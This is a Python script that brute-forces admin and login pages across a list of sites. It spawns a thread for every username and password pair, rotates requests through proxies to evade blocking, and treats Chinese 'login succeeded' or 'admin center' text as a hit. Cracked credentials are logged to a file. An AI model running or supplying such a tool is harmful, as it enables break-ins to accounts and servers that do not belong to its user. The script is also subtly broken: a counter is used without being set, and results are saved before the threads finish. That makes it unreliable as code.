import requests
import threading
import re

with open('url_list.txt') as f:
    url_list = f.read().splitlines()
url_list = [url for url in url_list if not url.startswith('#')]

with open('usernames.txt') as f:
    username_list = f.read().splitlines()

with open('passwords.txt') as f:
    password_list = f.read().splitlines()

enum_urls = []

proxy_list = ['ip1:port', 'ip2:port']


def scan(url, username, password, proxy):
    proxy = {'http': proxy, 'https': proxy}
    data = {'username': username, 'password': password}

    try:
        r = requests.post(url, proxies=proxy, data=data, timeout=2)
        if '登录成功' in r.text or '管理中心' in r.text:
            with open('result.txt', 'a+') as f:
                f.write(f'[+] {url} login succeeded! Username: {username} Password: {password}\n')
            enum_urls.append(url)
    except:
        pass


for url in url_list:
    if '/admin/' in url or '/login/' in url:
        for username in username_list:
            for password in password_list:
                proxy = proxy_list[i % len(proxy_list)]
                i += 1
                t = threading.Thread(target=scan, args=(url, username, password, proxy))
                t.start()

with open('enum_urls.txt', 'w') as f:
    for url in enum_urls:
        f.write(f'{url}\n')